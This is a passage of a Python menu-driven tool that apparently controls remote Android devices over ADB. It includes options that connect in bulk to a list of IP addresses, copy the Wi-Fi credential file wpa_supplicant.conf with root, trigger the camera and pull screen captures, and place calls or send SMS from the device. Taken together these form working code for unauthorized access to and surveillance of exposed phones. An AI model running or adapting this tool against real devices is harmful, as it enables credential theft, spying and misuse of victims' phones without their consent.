 {COLORS.GNSL}[ {COLORS.REDL}15{COLORS.GNSL} ] {COLORS.WHSL}KEYCODE_8             {COLORS.GNSL}[ {COLORS.REDL}36{COLORS.GNSL} ]{COLORS.WHSL}  KEYCODE_H              {COLORS.GNSL}[ {COLORS.REDL}57{COLORS.GNSL} ]{COLORS.WHSL}  KEYCODE_ALT_LEFT     {COLORS.GNSL}[ {COLORS.REDL}78{COLORS.GNSL} ]{COLORS.WHSL}  KEYCODE_NUM
 {COLORS.GNSL}[ {COLORS.REDL}16{COLORS.GNSL} ] {COLORS.WHSL}KEYCODE_9             {COLORS.GNSL}[ {COLORS.REDL}37{COLORS.GNSL} ]{COLORS.WHSL}  KEYCODE_I              {COLORS.GNSL}[ {COLORS.REDL}58{COLORS.GNSL} ]{COLORS.WHSL}  KEYCODE_ALT_RIGHT    {COLORS.GNSL}[ {COLORS.REDL}79{COLORS.GNSL} ]{COLORS.WHSL}  KEYCODE_HEADSETHOOK
 {COLORS.GNSL}[ {COLORS.REDL}17{COLORS.GNSL} ] {COLORS.WHSL}KEYCODE_STAR          {COLORS.GNSL}[ {COLORS.REDL}38{COLORS.GNSL} ]{COLORS.WHSL}  KEYCODE_J              {COLORS.GNSL}[ {COLORS.REDL}59{COLORS.GNSL} ]{COLORS.WHSL}  KEYCODE_SHIFT_LEFT   {COLORS.GNSL}[ {COLORS.REDL}80{COLORS.GNSL} ]{COLORS.WHSL}  KEYCODE_FOCUS
 {COLORS.GNSL}[ {COLORS.REDL}18{COLORS.GNSL} ] {COLORS.WHSL}KEYCODE_POUND         {COLORS.GNSL}[ {COLORS.REDL}39{COLORS.GNSL} ]{COLORS.WHSL}  KEYCODE_K              {COLORS.GNSL}[ {COLORS.REDL}60{COLORS.GNSL} ]{COLORS.WHSL}  KEYCODE_SHIFT_RIGHT  {COLORS.GNSL}[ {COLORS.REDL}81{COLORS.GNSL} ]{COLORS.WHSL}  KEYCODE_PLUS
 {COLORS.GNSL}[ {COLORS.REDL}19{COLORS.GNSL} ] {COLORS.WHSL}KEYCODE_DPAD_UP       {COLORS.GNSL}[ {COLORS.REDL}40{COLORS.GNSL} ]{COLORS.WHSL}  KEYCODE_L              {COLORS.GNSL}[ {COLORS.REDL}61{COLORS.GNSL} ]{COLORS.WHSL}  KEYCODE_TAB          {COLORS.GNSL}[ {COLORS.REDL}82{COLORS.GNSL} ]{COLORS.WHSL}  KEYCODE_MENU
 {COLORS.GNSL}[ {COLORS.REDL}20{COLORS.GNSL} ] {COLORS.WHSL}KEYCODE_DPAD_DOWN     {COLORS.GNSL}[ {COLORS.REDL}41{COLORS.GNSL} ]{COLORS.WHSL}  KEYCODE_M              {COLORS.GNSL}[ {COLORS.REDL}62{COLORS.GNSL} ]{COLORS.WHSL}  KEYCODE_SPACE        {COLORS.GNSL}[ {COLORS.REDL}83{COLORS.GNSL} ]{COLORS.WHSL}  KEYCODE_NOTIFICATION
 ''')
            print(f" Enter KEYCODE number.\n")
            num = input(f" Android Debug Bridge {COLORS.GNSL}[{COLORS.REDL} KEYCODE {COLORS.GNSL}]{COLORS.ENDL}: ")
            subprocess.call(f"adb -s {ip} shell input keyevent {num}", shell=True)
            print(f" You have activated the KEYCODE")
            t.sleep(4)
            print(page_1)

        elif option == '25':
            if not ip:
                print(f"\n{COLORS.REDL} You are not connect to device.\n")
            else:
                try:
                    print(f' Press ctrl + c to stop')
                    t.sleep(4)
                    subprocess.call(f"adb -s {ip} shell dumpsys activity", shell=True)

                except KeyboardInterrupt:
                    os.system('clear')
                    
                    print(page_1)
                    continue

        elif option == "26":
            try:
                print(f" Example path: /home/stalker/Desktop/adb/S-ADB/adb_clear.txt\n")
                path_to_ips = input(f" Enter the path to your txt file with IP addresses:")
            except KeyboardInterrupt:
                continue

            with open(path_to_ips, "r") as f:
                ip_adb_addresses = f.read().splitlines()

            for ip_address in ip_adb_addresses:
                thread = threading.Thread(target=conn, args=(ip_address,))
                thread.start()
        elif option == '27':
            print('wiki by @bafomet666')
            urls = [
                    "http://android-tip.com/soveti_i_poleznoe/77-adb-dlya-chaynikov-chast-1.html",
                    "https://irongamers.ru/forum/faq/izuchaem-android-desjat-osnovnyh-komand-adb-i-fastboot-kotorye-vy-dolzhny-znat-d",
                    "https://docs.microsoft.com/ru-ru/dual-screen/android/emulator/adb",
                    "https://softandroid.net/2020/01/05/adb-%D0%B8%D0%BB%D0%B8-android-debug-bridge-%D0%BE%D0%B1%D1%8A%D1%8F%D1%81%D0%BD%D1%8F%D1%8E-%D0%BD%D0%B0-%D0%BF%D0%B0%D0%BB%D1%8C%D1%86%D0%B0%D1%85-%D1%87%D1%82%D0%BE-%D1%8D%D1%82%D0%BE-%D0%B7/",
                    "https://www.youtube.com/watch?v=QOXmNDXDWhM",
                ]
            opbr = input('Open browser with links?y/n: ')
            if opbr.lower() == "y":
                for url in urls:

                    webbrowser.open(url)
                os.system('clear')
                print(page_1)
            else:
                os.system('clear')
                print(f'{COLORS.WHSL}                                               ADB Wiki \n\n\n')
                for i, url in enumerate(urls):
                    print(f'{COLORS.WHSL}[{i}]{COLORS.FIOL}{url}{COLORS.ENDL}')

        elif option == '28':
            print("wpa supplicant config.")
            try:
                print(f" Enter where you want to save the file.\n")
                location = input(f" path to local save wifi supplicant.conf {COLORS.GNSL}[Example:{COLORS.REDL} /home/user/ {COLORS.GNSL}]{COLORS.ENDL}:")
                subprocess.call(f"adb -s {ip} shell su -c 'cp /data/misc/wifi/wpa_supplicant.conf /data/local/tmp/1/'",
                                shell=True)
                subprocess.call(f"adb -s {ip} pull /data/local/tmp/1/wpa_supplicant.conf {location}", shell=True)

            except KeyboardInterrupt:
                if not ip:
                    print(f"\n{COLORS.REDL} there are no devices connected to the server.\n")

        elif option == '29':
            print("tcp forwarding port.")
            if not ip:
                print(f"\n{COLORS.REDL} You are not connect to device.\n")
            else:

                print(f" Enter the port on the device.\n")
                port_device = input(f" Android Debug Bridge port_device: ")

                print(f" Enter the forwarding port.\n")
                forward_port = input(" Android Debug Bridge forward_port: ")
                subprocess.call(f"adb -s {ip} forward tcp:" + port_device + " tcp:" + forward_port, shell=True)

        elif option == '30':
            if not ip:
                    print(f"\n{COLORS.REDL} You are not connect to device.\n")
            else:
                subprocess.call(f"adb -s {ip} shell input keyevent {27}", shell=True)
                save_data = datetime.datetime.today().strftime("%Y-%m-%d-%H.%M.%S")
                filename = f'photo__{ip}__{save_data}'
                path_to_file = 'result/' + filename
                subprocess.call(f"adb -s {ip} shell am start -a android.media.action.STILL_IMAGE_CAMERA", shell=True)
                subprocess.call(f"adb -s {ip} shell input keyevent KEYCODE_FOCUS", shell=True)
                #33subprocess.call(f"adb -s {ip} shell input keyevent KEYCODE_VOLUME_UP", shell=True)
                #print(f"\n Ожидайте происходит загрузка скриншота в папку result\n Может быть такое что на устройстве нет камеры,\n как у smartTV\n")
                pipe = subprocess.Popen(['adb', '-s', ip, 'shell', 'screencap', '/data/local/tmp/1/screen.png'], stdout=subprocess.PIPE)
                title, error = pipe.communicate()
                title = title.decode()
                print(title)
                subprocess.call(f"adb -s {ip} pull /data/local/tmp/1/screen.png {path_to_file}", shell=True)

        elif option == '31':
            subprocess.call("adb reconnect offline >> /dev/null", shell=True)
            print("\n Trying reconnect offline devices.\n")
        elif option == '32':
            print('\n Calling menu.')
            #shell am start -a android.intent.action.CALL -d tel:"phone no. to call"
            phonenumber = input("Enter phonenumber to call: ")
            pipe = subprocess.Popen(["adb", "shell", "am", "start", "-a", "android.intent.CALL", "-d", 'tel:"', phonenumber, '"'], stdout=subprocess.PIPE)
            title, error = pipe.communicate()
            title = title.decode()
            if 'error' in title:
                print(f'{COLORS.REDL} Error:{title}{COLORS.ENDL}')
            else:
                print(f'{COLORS.WHSL} {title}')
        elif option == '33':
            print('\n Send messages.')
            phonenumber = input("Phonenumber to send message: ")
            body_sms = input("SMS BODY: ")
            subprocess.call(f'adb shell am start -a android.intent.action.SENDTO -d sms:{phonenumber} --es sms_body "{body_sms}" --ez exit_on_sent true', shell=True)
            subprocess.call(f'adb shell input keyevent 22', shell=True)
            subprocess.call(f'adb shell input keyevent 66', shell=True)
        elif option == '66':
            os.system('clear')
            print(banner.banner)
            score_board()
            print(page_1)

        elif option == '77':
            subprocess.call("adb disconnect >> /dev/null", shell=True)
            subprocess.call("adb kill-server >> /dev/null", shell=True)
            os.system('clear')
            
            print(f' Server ADB Poweroff.')
        elif option == '0':
            subprocess.call("adb disconnect >> /dev/null", shell=True)
            subprocess.call("adb kill-server >> /dev/null", shell=True)
            os.system('clear')
            
            return 0
        elif option == '99':
            print('{COLORS.REDL}.')
            os.system('clear')
            print(banner.banner)
            banner.about()
        else:
            print(banner.banner)
            score_board()
            print(page_1)

if __name__ == "__main__":
    android_debug()
